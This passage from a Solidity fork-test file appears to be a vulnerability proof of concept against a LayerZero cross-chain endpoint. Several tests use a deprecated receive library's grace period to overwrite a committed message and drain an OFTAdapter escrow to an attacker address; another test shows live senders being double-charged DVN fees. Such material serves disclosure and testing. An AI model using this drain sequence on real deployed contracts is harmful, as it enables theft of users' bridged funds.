        console2.log("live inbound nonce                 :", liveInboundNonce);
        console2.log("live lazy inbound nonce            :", liveLazyInboundNonce);
        console2.log("this receiver uses the protocol default receive-lib path");
        console2.log("this receiver does not rely on app-specific receive-lib timeout");
        console2.log("first committed verification state on a live production path was not canonical");
        console2.log("deprecated grace-valid path replaced endpoint state before execution");
        console2.log("this is an EndpointV2 default-path revocation failure, not OApp misconfiguration");
        console2.log("============================================");
    }

    function test_FORK_OfficialOFTAdapter_RevocationEnforcementBroken_And_Drain() public {
        console2.log("==========================================================");
        console2.log("OFFICIAL OFTAdapter CANONICAL FLOW: revocation enforcement");
        console2.log("failure across current vs deprecated grace-valid paths");
        console2.log("Receiver: OFTAdapterCanonical (faithful reproduction of");
        console2.log("  OFTAdapter.sol / OFTCore._lzReceive / OFTMsgCodec)");
        console2.log("==========================================================");

        // ---------------------------------------------------------------------
        // Phase 0: strictly post-upgrade
        // ---------------------------------------------------------------------
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(
            endpoint.defaultReceiveLibrary(SRC_EID),
            address(libNew),
            "current default receive library must be libNew"
        );

        // ---------------------------------------------------------------------
        // Phase 1: deploy canonical OFTAdapter receiver and prepare escrow
        // ---------------------------------------------------------------------
        MockToken innerToken = new MockToken();
        OFTAdapterCanonical adapter = new OFTAdapterCanonical(
            address(innerToken),
            address(endpoint),
            18,
            6
        );

        uint256 escrowBalance = 2_000_000e18;
        innerToken.mint(address(adapter), escrowBalance);
        adapter.setPeer(SRC_EID, REMOTE_VAULT);

        uint64 nonce = endpoint.lazyInboundNonce(address(adapter), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeaderFor(nonce, address(adapter));

        assertEq(
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "fresh adapter nonce slot must be empty"
        );

        console2.log("==== OFFICIAL OFT REVOCATION ENFORCEMENT TEST ====");
        console2.log("fork block                 :", FORK_BLOCK);
        console2.log("upgrade block              :", upgradeBlock);
        console2.log("execution block            :", block.number);
        console2.log("adapter                    :", address(adapter));
        console2.log("nonce                      :", nonce);
        console2.log("current receive lib        :", address(libNew));
        console2.log("deprecated grace-valid lib :", address(libOld));
        console2.log("adapter escrow             :", escrowBalance);

        // ---------------------------------------------------------------------
        // Phase 2: prove current trust path excludes old DVN(s)
        // ---------------------------------------------------------------------
        UlnConfig memory curCfg = libNew.getUlnConfig(address(adapter), SRC_EID);
        UlnConfig memory oldCfg = libOld.getUlnConfig(address(adapter), SRC_EID);
        address revokedFromCurrentDVN = oldCfg.requiredDVNs[0];

        assertEq(curCfg.requiredDVNCount, 1, "libNew requiredDVNCount must be 1");
        assertEq(curCfg.requiredDVNs[0], dvnNew, "libNew must require dvnNew");
        assertTrue(revokedFromCurrentDVN != curCfg.requiredDVNs[0], "revokedFromCurrentDVN unexpectedly equals current DVN");
        assertTrue(
            curCfg.requiredDVNs[0] != revokedFromCurrentDVN,
            "revokedFromCurrentDVN unexpectedly trusted by current config"
        );

        console2.log("current trusted DVN        :", curCfg.requiredDVNs[0]);
        console2.log("revokedFromCurrentDVN (real deprecated config):", revokedFromCurrentDVN);
        console2.log("old requiredDVNCount (REAL):", uint256(oldCfg.requiredDVNCount));
        console2.log("old confirmations (REAL)   :", uint256(oldCfg.confirmations));

        // ---------------------------------------------------------------------
        // Phase 3: current path commits first
        // ---------------------------------------------------------------------
        uint64 legitAmountSD = 500e6;
        bytes memory legitMsg = OFTMsgCodecFaithful.encode(
            bytes32(uint256(uint160(alice))),
            legitAmountSD,
            ""
        );
        bytes32 legitGuid = keccak256("official-oft-revocation-legit-guid");
        bytes32 legitHash = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedAfterCurrentCommit =
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedAfterCurrentCommit, legitHash, "current path must commit legit OFT hash first");

        console2.log("current-path commit established canonical state");
        console2.log("legitHash:");
        console2.logBytes32(legitHash);

        // ---------------------------------------------------------------------
        // Phase 4: prove revoked current-path identity cannot finalize through libNew
        // ---------------------------------------------------------------------
        uint64 forgedAmountSD = uint64(escrowBalance / adapter.decimalConversionRate());
        bytes memory forgedMsg = OFTMsgCodecFaithful.encode(
            bytes32(uint256(uint160(attacker))),
            forgedAmountSD,
            ""
        );
        bytes32 forgedGuid = keccak256("official-oft-revocation-forged-guid");
        bytes32 forgedHash = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        vm.prank(revokedFromCurrentDVN);
        libNew.verify(header, forgedHash, 1);

        vm.prank(revokedFromCurrentDVN);
        vm.expectRevert(ReceiveUlnBase.LZ_ULN_Verifying.selector);
        libNew.commitVerification(header, forgedHash);

        console2.log("revoked-from-current identity cannot finalize via current path");

        // ---------------------------------------------------------------------
        // Phase 5: deprecated grace-valid path still mutates canonical state
        // ---------------------------------------------------------------------
        assertTrue(
            endpoint.isValidReceiveLibrary(address(adapter), SRC_EID, address(libOld)),
            "deprecated library must remain grace-valid for adapter path"
        );

        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);

        vm.prank(revokedFromCurrentDVN);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfterDeprecatedOverwrite =
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(
            storedAfterDeprecatedOverwrite,
            forgedHash,
            "deprecated grace-valid path must overwrite canonical OFT state"
        );
        assertTrue(
            storedAfterDeprecatedOverwrite != legitHash,
            "current-path OFT commit must lose canonicality"
        );

        console2.log("revoked grace-valid path still mutated canonical state");
        console2.log("execution outcome is no longer determined by current trust path");
        console2.log("forgedHash:");
        console2.logBytes32(forgedHash);

        // ---------------------------------------------------------------------
        // Phase 6: execution follows overwritten state, not current-path commit
        // ---------------------------------------------------------------------
        uint256 aliceBefore = innerToken.balanceOf(alice);
        uint256 attackerBefore = innerToken.balanceOf(attacker);
        uint256 adapterBefore = innerToken.balanceOf(address(adapter));

        Origin memory origin = Origin({
            srcEid: SRC_EID,
            sender: REMOTE_VAULT,
            nonce: nonce
        });
        endpoint.lzReceive(origin, address(adapter), forgedGuid, forgedMsg, "");

        uint256 aliceAfter = innerToken.balanceOf(alice);
        uint256 attackerAfter = innerToken.balanceOf(attacker);
        uint256 adapterAfter = innerToken.balanceOf(address(adapter));

        assertEq(aliceAfter, aliceBefore, "legit OFT current-path credit never executed");
        assertEq(attackerAfter, attackerBefore + escrowBalance, "forged OFT payload must drain full escrow");
        assertEq(adapterAfter, 0, "canonical OFTAdapter escrow must be drained");

        console2.log("execution followed overwritten state, not current-path commit");
        console2.log("adapter escrow before      :", adapterBefore);
        console2.log("adapter escrow after       :", adapterAfter);
        console2.log("alice balance after        :", aliceAfter);
        console2.log("attacker balance after     :", attackerAfter);
        console2.log("==== OFFICIAL OFT REVOCATION ENFORCEMENT BROKEN (PASS) ====");
    }

    function test_FORK_OfficialOFTAdapter_Overwrite_And_Drain() public {
        console2.log("==========================================================");
        console2.log("OFFICIAL OFTAdapter CANONICAL FLOW: grace overwrite test");
        console2.log("Receiver: OFTAdapterCanonical (faithful reproduction of");
        console2.log("  OFTAdapter.sol / OFTCore._lzReceive / OFTMsgCodec)");
        console2.log("Option C: official OFT package not importable from");
        console2.log("  messagelib test harness; faithful source reproduction.");
        console2.log("==========================================================");

        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");
        assertEq(endpoint.defaultReceiveLibrary(SRC_EID), address(libNew), "default must be libNew");

        // --- Deploy official OFTAdapter-faithful receiver ---
        MockToken innerTkn = new MockToken();
        // localDecimals=18, sharedDecimals=6 (standard OFT config)
        OFTAdapterCanonical adapter = new OFTAdapterCanonical(
            address(innerTkn),
            address(endpoint),
            18, // localDecimals
            6   // sharedDecimals
        );

        // Pre-fund escrow (mirrors lock phase: users lock tokens into OFTAdapter)
        uint256 escrowBalance = 2_000_000e18;
        innerTkn.mint(address(adapter), escrowBalance);

        // Set trusted peer (mirrors OAppCore.setPeer, onlyOwner)
        adapter.setPeer(SRC_EID, REMOTE_VAULT);

        console2.log("adapter (OFTAdapterCanonical):", address(adapter));
        console2.log("innerToken                   :", address(innerTkn));
        console2.log("escrow balance               :", escrowBalance);
        console2.log("decimalConversionRate        :", adapter.decimalConversionRate());

        // Nonce for this adapter's path
        uint64 nonce = endpoint.lazyInboundNonce(address(adapter), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeaderFor(nonce, address(adapter));

        assertEq(
            endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "adapter nonce slot must be empty"
        );

        // --- Step 1: libNew commits legitimate OFT credit (alice gets 500 tokens) ---
        // Encode using OFTMsgCodec: (bytes32 sendTo, uint64 amountSD)
        // 500e18 in local decimals = 500e6 in shared decimals (div by 1e12)
        uint64 legitAmountSD = 500e6;
        bytes32 aliceBytes32 = bytes32(uint256(uint160(alice)));
        bytes memory legitMsg = OFTMsgCodecFaithful.encode(aliceBytes32, legitAmountSD, "");
        bytes32 legitGuid = keccak256("oft-adapter-legit-guid");
        bytes32 legitHash = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedLegit = endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedLegit, legitHash, "legit OFT credit hash stored by libNew");
        console2.log("legitHash committed (OFT credit: 500 tokens to alice)");

        // --- Step 2: libOld overwrites with forged full-drain to attacker ---
        // attacker drains full escrow: 2_000_000e18 = 2_000_000e6 in SD
        uint64 forgedAmountSD = uint64(escrowBalance / adapter.decimalConversionRate());
        bytes32 attackerBytes32 = bytes32(uint256(uint160(attacker)));
        bytes memory forgedMsg = OFTMsgCodecFaithful.encode(attackerBytes32, forgedAmountSD, "");
        bytes32 forgedGuid = keccak256("oft-adapter-forged-guid");
        bytes32 forgedHash = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        // Read REAL libOld config for the adapter path
        UlnConfig memory oldCfg = libOld.getUlnConfig(address(adapter), SRC_EID);
        require(oldCfg.requiredDVNCount > 0, "libOld: no requiredDVNs for adapter");
        address dvnOldFirst = oldCfg.requiredDVNs[0];

        console2.log("libOld requiredDVNCount (REAL):", uint256(oldCfg.requiredDVNCount));
        console2.log("libOld confirmations (REAL)   :", uint256(oldCfg.confirmations));

        // Satisfy REAL libOld quorum
        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);
        vm.prank(dvnOldFirst);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfter = endpoint.inboundPayloadHash(address(adapter), SRC_EID, REMOTE_VAULT, nonce);
        assertEq(storedAfter, forgedHash, "OVERWRITE: forged drain replaced legit OFT credit");
        assertTrue(storedAfter != legitHash, "legit OFT credit hash erased");
        console2.log("forgedHash overwrote (attacker drains full OFTAdapter escrow)");

        // --- Step 3: Execute via EndpointV2.lzReceive ---
        uint256 aliceBefore = innerTkn.balanceOf(alice);
        uint256 attackerBefore = innerTkn.balanceOf(attacker);
        uint256 adapterBefore = innerTkn.balanceOf(address(adapter));

        Origin memory origin = Origin({srcEid: SRC_EID, sender: REMOTE_VAULT, nonce: nonce});
        endpoint.lzReceive(origin, address(adapter), forgedGuid, forgedMsg, "");

        // --- Step 4: Verify impact ---
        uint256 aliceAfter = innerTkn.balanceOf(alice);
        uint256 attackerAfter = innerTkn.balanceOf(attacker);
        uint256 adapterAfter = innerTkn.balanceOf(address(adapter));

        // Alice never received the legitimate 500-token OFT credit
        assertEq(aliceAfter, aliceBefore, "alice must NOT receive legit OFT credit");

        // Attacker received the full escrow via forged OFT credit
        assertEq(attackerAfter, attackerBefore + escrowBalance, "attacker received full OFTAdapter escrow");

        // OFTAdapter escrow fully drained
        assertEq(adapterAfter, 0, "OFTAdapter escrow fully drained");

        // Triage-friendly logs
        console2.log("==== OFFICIAL OFTAdapter: ESCROW DRAIN PROOF ====");
        console2.log("Implementation: OFTAdapterCanonical (faithful reproduction)");
        console2.log("  Source: OFTAdapter.sol / OFTCore._lzReceive / OFTMsgCodec");
        console2.log("  _credit(): innerToken.safeTransfer(_to, _amountLD)");
        console2.log("adapter escrow before   :", adapterBefore);
        console2.log("adapter escrow after    :", adapterAfter);
        console2.log("alice balance before    :", aliceBefore);
        console2.log("alice balance after     :", aliceAfter);
        console2.log("attacker balance before :", attackerBefore);
        console2.log("attacker balance after  :", attackerAfter);
        console2.log("libOld quorum (REAL)    :", uint256(oldCfg.requiredDVNCount));
        console2.log("libOld confs  (REAL)    :", uint256(oldCfg.confirmations));
        console2.log("legitHash (500 to alice via OFTMsgCodec):");
        console2.logBytes32(legitHash);
        console2.log("forgedHash (full drain to attacker via OFTMsgCodec):");
        console2.logBytes32(forgedHash);
        console2.log("Executed payload = forged OFT credit. Legit never ran.");
        console2.log("Bug is in EndpointV2 grace overwrite, not OFTAdapter.");
        console2.log("This is the canonical OFTAdapter._credit() escrow-release");
        console2.log("pattern used by production OFTAdapter deployments.");
        console2.log("===================================================");
    }

    function test_FORK_LiveSendUln302_ABCStablecoin_Overlap_DoubleChargesSameDVN() public {
        _assertLiveOverlapFeeOvercharge("ABC Stablecoin", ABC_STABLECOIN, AVAX_EID);
    }

    function test_FORK_LiveSendUln302_KRWINStablecoin_Overlap_DoubleChargesSameDVN() public {
        _assertLiveOverlapFeeOvercharge("KRWIN Stablecoin", KRWIN_STABLECOIN, AVAX_EID);
    }

    // ----------------- helpers -----------------

    function _buildPacketHeader(uint64 nonce) internal view returns (bytes memory) {
        return abi.encodePacked(
            uint8(1),                                 // version
            nonce,                                    // uint64
            SRC_EID,                                  // uint32
            REMOTE_VAULT,                             // bytes32 sender
            DST_EID,                                  // uint32
            bytes32(uint256(uint160(address(vault)))) // receiver (bytes32)
        );
    }

    /// @dev Like _buildPacketHeader but for an arbitrary receiver address.
    function _buildPacketHeaderFor(uint64 nonce, address receiver) internal pure returns (bytes memory) {
        return _buildPacketHeaderForPath(nonce, receiver, REMOTE_VAULT);
    }

    /// @dev Build a packet header for an arbitrary receiver + sender path.
    function _buildPacketHeaderForPath(uint64 nonce, address receiver, bytes32 sender) internal pure returns (bytes memory) {
        return abi.encodePacked(
            uint8(1),
            nonce,
            SRC_EID,
            sender,
            DST_EID,
            bytes32(uint256(uint160(receiver)))
        );
    }

    /// @dev Configure libNew default config for SRC_EID.
    function _setDefaultDVN(ReceiveUln302 lib, address dvn) internal {
        address[] memory dvns = new address[](1);
        dvns[0] = dvn;

        UlnConfig memory cfg = UlnConfig({
            confirmations: 1,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });

        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam(SRC_EID, cfg);
        lib.setDefaultUlnConfigs(params);
    }

    /// @dev Satisfy REAL quorum for libOld by calling verify() from each required DVN.
    ///      This avoids the LZ_ULN_Verifying() failure *without modifying libOld config*.
    function _verifyWithRealLibOldQuorum(
        bytes memory header,
        bytes32 payloadHash,
        UlnConfig memory oldCfg
    ) internal {
        // oldCfg.confirmations + oldCfg.requiredDVNs[] are read from chain state
        uint64 confs = oldCfg.confirmations;

        // Some configs may have requiredDVNs array longer than requiredDVNCount; only first requiredDVNCount matter.
        uint256 n = uint256(oldCfg.requiredDVNCount);
        require(n > 0, "libOld quorum: n=0");

        for (uint256 i = 0; i < n; i++) {
            address dvn = oldCfg.requiredDVNs[i];
            require(dvn != address(0), "libOld quorum: dvn=0");

            vm.prank(dvn);
            libOld.verify(header, payloadHash, confs);
        }
    }

    function _assertLiveOverlapFeeOvercharge(
        string memory label,
        address sender,
        uint32 dstEid
    ) internal {
        SendUln302 sendLib = SendUln302(payable(MAINNET_SEND302));
        SendUlnFeeHarness harness = new SendUlnFeeHarness();
        bytes32 receiver = bytes32(uint256(uint160(address(0xBEEF))));

        UlnConfig memory cfg = sendLib.getUlnConfig(sender, dstEid);
        (address[] memory overlapSet, uint256 nominalQuorum, uint256 distinctEffectiveQuorum,) = _computeConfigOverlap(cfg);

        assertEq(cfg.confirmations, 2, string.concat(label, ": unexpected confirmations"));
        assertEq(cfg.requiredDVNCount, 1, string.concat(label, ": required count"));
        assertEq(cfg.optionalDVNCount, 1, string.concat(label, ": optional count"));
        assertEq(cfg.optionalDVNThreshold, 1, string.concat(label, ": optional threshold"));
        assertEq(overlapSet.length, 1, string.concat(label, ": expected one overlapped DVN"));
        assertEq(overlapSet[0], cfg.requiredDVNs[0], string.concat(label, ": overlapped DVN mismatch"));
        assertEq(nominalQuorum, 2, string.concat(label, ": nominal quorum mismatch"));
        assertEq(
            distinctEffectiveQuorum,
            1,
            string.concat(label, ": distinct quorum should collapse from 2 to 1")
        );

        uint256 singleDvnFee = ILayerZeroDVN(cfg.requiredDVNs[0]).getFee(dstEid, cfg.confirmations, sender, "");
        uint256 buggyVerifierFee = harness.quoteVerifierRaw(cfg, dstEid, sender);

        assertGt(singleDvnFee, 0, string.concat(label, ": single DVN fee must be non-zero"));
        assertEq(
            buggyVerifierFee,
            singleDvnFee * 2,
            string.concat(label, ": same DVN must be charged twice by _getFees")
        );

        Packet memory packet = Packet({
            nonce: 1,
            srcEid: DST_EID,
            sender: sender,
            dstEid: dstEid,
            receiver: receiver,
            guid: keccak256(abi.encodePacked("live-send-overlap-guid", label)),
            message: hex"1234"
        });

        bytes memory fullOptions = _type3OptionsWithLzReceive(200000);
        bytes memory executorOptions = _executorOnlyLzReceiveOption(200000);
        assertEq(
            endpoint.getSendLibrary(sender, dstEid),
            MAINNET_SEND302,
            string.concat(label, ": endpoint send path must resolve to live SendUln302")
        );
        MessagingFee memory quoted = ISendLib(MAINNET_SEND302).quote(packet, fullOptions, false);
        MessagingParams memory params = MessagingParams({
            dstEid: dstEid,
            receiver: receiver,
            message: packet.message,
            options: fullOptions,
            payInLzToken: false
        });
        MessagingFee memory endpointQuoted = endpoint.quote(params, sender);

        assertEq(
            endpointQuoted.nativeFee,
            quoted.nativeFee,
            string.concat(label, ": endpoint quote must route through the same buggy send library path")
        );
        assertEq(
            endpointQuoted.lzTokenFee,
            quoted.lzTokenFee,
            string.concat(label, ": endpoint and send library quote must agree on lzToken fee")
        );

        ExecutorConfig memory execCfg = sendLib.getExecutorConfig(sender, dstEid);
        uint256 executorFee = ILayerZeroExecutor(execCfg.executor).getFee(
            dstEid,
            sender,
            packet.message.length,
            executorOptions
        );

        address treasury = sendLib.treasury();
        uint256 buggySubtotal = buggyVerifierFee + executorFee;
        uint256 dedupSubtotal = singleDvnFee + executorFee;
        uint256 buggyTreasuryFee = ILayerZeroTreasury(treasury).getFee(sender, dstEid, buggySubtotal, false);
        uint256 dedupTreasuryFee = ILayerZeroTreasury(treasury).getFee(sender, dstEid, dedupSubtotal, false);

        assertLe(buggyTreasuryFee, buggySubtotal, string.concat(label, ": unexpected treasury cap branch"));
        assertLe(dedupTreasuryFee, dedupSubtotal, string.concat(label, ": unexpected treasury cap branch"));

        uint256 buggyTotal = buggySubtotal + buggyTreasuryFee;
        uint256 dedupTotal = dedupSubtotal + dedupTreasuryFee;
        uint256 overcharge = buggyTotal - dedupTotal;

        assertEq(quoted.nativeFee, buggyTotal, string.concat(label, ": live quote must follow buggy accounting"));
        assertEq(endpointQuoted.nativeFee, buggyTotal, string.concat(label, ": endpoint live quote must follow buggy accounting"));
        assertGt(overcharge, 0, string.concat(label, ": live sender must overpay"));

        console2.log("==== LIVE SEND ULN OVERLAP FEE OVERCHARGE ====");
        console2.log("label                       :", label);
        console2.log("sender                      :", sender);
        console2.log("dstEid                      :", uint256(dstEid));
        console2.log("overlapped DVN              :", overlapSet[0]);
        console2.log("single DVN fee              :", singleDvnFee);
        console2.log("buggy verifier fee          :", buggyVerifierFee);
        console2.log("executor fee                :", executorFee);
        console2.log("treasury fee (buggy path)   :", buggyTreasuryFee);
        console2.log("endpoint quote.nativeFee    :", endpointQuoted.nativeFee);
        console2.log("quoted.nativeFee            :", quoted.nativeFee);
        console2.log("dedup-correct total         :", dedupTotal);
        console2.log("per-send overcharge         :", overcharge);
        console2.log("==============================================");
    }

    function _inspectAndAssertNoOverlap(string memory label, UlnConfig memory cfg) internal {
        (address[] memory overlapSet, uint256 nominalQuorum, uint256 distinctEffectiveQuorum, uint256 distinctConfigured) =
            _computeConfigOverlap(cfg);

        console2.log("----------------------------------------");
        console2.log(label);
        console2.log("confirmations                 :", uint256(cfg.confirmations));
        console2.log("requiredDVNCount             :", uint256(cfg.requiredDVNCount));
        console2.log("optionalDVNCount             :", uint256(cfg.optionalDVNCount));
        console2.log("optionalDVNThreshold         :", uint256(cfg.optionalDVNThreshold));
        console2.log("required set:");
        _logAddressArray(cfg.requiredDVNs, uint256(cfg.requiredDVNCount), "  requiredDVN");
        console2.log("optional set:");
        _logAddressArray(cfg.optionalDVNs, uint256(cfg.optionalDVNCount), "  optionalDVN");
        console2.log("overlap set:");
        _logAddressArray(overlapSet, overlapSet.length, "  overlapDVN");
        console2.log("nominal quorum              :", nominalQuorum);
        console2.log("distinct configured signers :", distinctConfigured);
        console2.log("distinct effective quorum   :", distinctEffectiveQuorum);

        assertEq(overlapSet.length, 0, string.concat(label, ": overlap unexpectedly present"));
        assertEq(
            distinctEffectiveQuorum,
            nominalQuorum,
            string.concat(label, ": overlap unexpectedly reduced distinct quorum")
        );
    }

    function _assertConfigsEquivalent(string memory label, UlnConfig memory a, UlnConfig memory b) internal {
        assertEq(a.confirmations, b.confirmations, string.concat(label, ": confirmations mismatch"));
        assertEq(a.requiredDVNCount, b.requiredDVNCount, string.concat(label, ": required count mismatch"));
        assertEq(a.optionalDVNCount, b.optionalDVNCount, string.concat(label, ": optional count mismatch"));
        assertEq(
            a.optionalDVNThreshold,
            b.optionalDVNThreshold,
            string.concat(label, ": optional threshold mismatch")
        );
        assertEq(a.requiredDVNs.length, b.requiredDVNs.length, string.concat(label, ": required length mismatch"));
        assertEq(a.optionalDVNs.length, b.optionalDVNs.length, string.concat(label, ": optional length mismatch"));

        for (uint256 i = 0; i < a.requiredDVNs.length; i++) {
            assertEq(a.requiredDVNs[i], b.requiredDVNs[i], string.concat(label, ": required DVN mismatch"));
        }
        for (uint256 i = 0; i < a.optionalDVNs.length; i++) {
            assertEq(a.optionalDVNs[i], b.optionalDVNs[i], string.concat(label, ": optional DVN mismatch"));
        }
    }

    function _computeConfigOverlap(
        UlnConfig memory cfg
    )
        internal
        pure
        returns (
            address[] memory overlapSet,
            uint256 nominalQuorum,
            uint256 distinctEffectiveQuorum,
            uint256 distinctConfigured
        )
    {
        uint256 requiredCount = uint256(cfg.requiredDVNCount);
        uint256 optionalCount = uint256(cfg.optionalDVNCount);
        uint256 optionalThreshold = uint256(cfg.optionalDVNThreshold);

        address[] memory tmpOverlap = new address[](requiredCount < optionalCount ? requiredCount : optionalCount);
        uint256 overlapCount = 0;

        for (uint256 i = 0; i < requiredCount; i++) {
            for (uint256 j = 0; j < optionalCount; j++) {
                if (cfg.requiredDVNs[i] == cfg.optionalDVNs[j]) {
                    tmpOverlap[overlapCount] = cfg.requiredDVNs[i];
                    overlapCount++;
                    break;
                }
            }
        }

        overlapSet = new address[](overlapCount);
        for (uint256 i = 0; i < overlapCount; i++) {
            overlapSet[i] = tmpOverlap[i];
        }

        nominalQuorum = requiredCount + optionalThreshold;

        uint256 overlapApplied = overlapCount;
        if (overlapApplied > optionalThreshold) {
            overlapApplied = optionalThreshold;
        }
        distinctEffectiveQuorum = requiredCount + optionalThreshold - overlapApplied;
        distinctConfigured = requiredCount + optionalCount - overlapCount;
    }

    function _logAddressArray(address[] memory addrs, uint256 n, string memory prefix) internal {
        if (n == 0) {
            console2.log(string.concat(prefix, "[empty]"));
            return;
        }

        for (uint256 i = 0; i < n; i++) {
            console2.log(prefix, i, ":", addrs[i]);
        }
    }

    function _type3OptionsWithLzReceive(uint128 gasLimit) internal pure returns (bytes memory) {
        return abi.encodePacked(uint16(3), _executorOnlyLzReceiveOption(gasLimit));
    }

    function _executorOnlyLzReceiveOption(uint128 gasLimit) internal pure returns (bytes memory) {
        return abi.encodePacked(uint8(1), uint16(17), uint8(1), gasLimit);
    }
}
